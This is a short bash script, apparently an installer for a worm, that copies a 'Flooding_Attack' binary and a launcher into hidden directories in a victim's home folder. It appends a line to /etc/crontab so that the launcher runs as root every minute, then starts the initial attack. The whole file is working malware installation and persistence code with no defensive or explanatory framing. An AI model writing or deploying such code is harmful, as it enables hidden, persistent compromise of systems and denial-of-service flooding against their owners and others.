#!/bin/bash

# This script is to:
#   (1) Copy the launcher file into the default hidden directory
#   (2) Copy the worm file into the default hidden directory
#   (3) Tamper the crontab file
#   (4) Launch the initial attack

tmpdir="/tmp/.worm0716023"
ldir1="/home/victim/.Launch_Attack"
ldir2="/home/victim/.you_cant_see_me"
lfname="launcher.sh"
wdir1="/home/victim/.etc/.module"
wdir2="/home/victim/.firefox/.module"
wfname="Flooding_Attack"

require_worm_distributed() {
    if [ ! -f "$wdir1/$wfname" ]; then
        mkdir -p "$wdir1"
        cp "$tmpdir/Flooding_Attack" "$wdir1/$wfname"
    fi

    if [ ! -f "$ldir1/$lfname" ]; then
        mkdir -p "$ldir1"
        cp "$tmpdir/launcher.sh" "$ldir1/$lfname"
    fi
}

require_crontab_tampered() {
    local crtbpath="/etc/crontab"
    if  ! grep -q "$lfname" $crtbpath; then
        echo "* * * * * root [ -f '$ldir1/$lfname' ] && cd '$ldir1' && chmod +x './$lfname' && './$lfname' || [ -f '$ldir2/$lfname' ] && cd '$ldir2' && chmod +x './$lfname' && './$lfname'" >> $crtbpath
    fi
}


require_crontab_tampered &&\
require_worm_distributed &&\
chmod +x $tmpdir/launcher.sh &&\
$tmpdir/launcher.sh
